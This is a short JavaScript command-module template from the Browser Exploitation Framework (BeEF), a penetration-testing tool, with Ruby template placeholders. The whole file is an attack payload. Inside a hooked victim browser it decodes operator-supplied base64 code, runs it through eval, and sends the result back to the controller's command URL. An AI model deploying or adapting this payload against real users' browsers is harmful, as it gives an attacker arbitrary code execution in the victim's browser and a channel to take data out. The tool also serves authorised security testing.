//
// # Copyright (c) 2006-2019 TomAPU tomapufckgml@gmail.com
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	result=eval(decodeURIComponent(beef.encode.base64.decode('<%= Base64.strict_encode64(@code) %>')));
	result=String(result);
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+result);
});
